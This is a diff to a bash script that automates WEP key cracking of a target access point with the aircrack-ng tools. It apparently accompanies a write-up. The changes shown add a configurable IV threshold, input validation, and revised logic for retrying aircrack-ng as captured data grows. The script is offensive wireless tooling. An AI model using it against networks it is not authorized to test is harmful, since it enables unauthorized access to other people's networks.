@@ -14,7 +14,7 @@
 #                 of the writeup.
 #
 # Usage:
-#   sudo ./wep-crack.sh -i wlp2s0 -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix]
+#   sudo ./wep-crack.sh -i wlp2s0 -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix] [-t N]
 #
 # Example:
 #   sudo ./wep-crack.sh -i wlan0 -b 11:22:33:44:55:66 -c 6 -m active -o cap_gl
@@ -31,7 +31,8 @@ CHANNEL=""
 ESSID=""
 MODE="active"
 PREFIX="wepcap"
-IV_TARGET=20000          # aircrack is retried each time #Data grows by this much
+IV_TARGET=20000          # aircrack is retried each time #Data grows by this much (-t)
+MIN_IVS=5000             # no aircrack attempt until #Data reaches this many IVs
 RETRY_SECS=15            # how often to re-check the capture / re-run aircrack
 
 usage() { sed -n '2,30p' "$0"; exit 1; }
@@ -56,6 +57,7 @@ for t in airmon-ng airodump-ng aireplay-ng aircrack-ng iw; do
   command -v "$t" >/dev/null || { echo "[!] Missing: $t (sudo dnf install aircrack-ng)"; exit 1; }
 done
 [[ "$MODE" == "active" || "$MODE" == "passive" ]] || { echo "[!] -m must be active|passive"; exit 1; }
+[[ "$IV_TARGET" =~ ^[1-9][0-9]*$ ]] || { echo "[!] -t must be a positive number of IVs"; exit 1; }
 
 # ---- output location ------------------------------------------------------
 # All capture/key/log files live under logs/ (gitignored) to keep the repo clean.
@@ -134,19 +136,19 @@ fi
 echo "[*] Watching #Data and retrying aircrack-ng every ${RETRY_SECS}s..."
 echo "[*] Press Ctrl-C to stop (cleanup is automatic)."
 KEYFILE="${OUT}.key"
-last_iv=0
+last_iv=0                # #Data at the last aircrack attempt (0 = none yet)
 while true; do
   sleep "$RETRY_SECS"
   CSV="${OUT}-01.csv"
   ivs=0
   if [[ -f "$CSV" ]]; then
-    # column 11 (#Data) on the AP row matching our BSSID
+    # column 11 ("# IV") on the AP row matching our BSSID
     ivs=$(awk -F, -v b="${BSSID^^}" 'toupper($1) ~ b {gsub(/ /,"",$11); print $11; exit}' "$CSV")
     ivs=${ivs:-0}
   fi
   echo "    [#Data ~ ${ivs} IVs]"
-  # only bother running aircrack once we have a reasonable pile, and each time it grows
-  if (( ivs >= 5000 )) && (( ivs - last_iv >= 2000 )); then
+  # first try once we have a reasonable pile, then again each time #Data grows by IV_TARGET
+  if (( ivs >= MIN_IVS && (last_iv == 0 || ivs - last_iv >= IV_TARGET) )); then
     last_iv=$ivs
     if aircrack-ng -q -l "$KEYFILE" "${OUT}-01.cap" >/dev/null 2>&1 && [[ -s "$KEYFILE" ]]; then
       echo
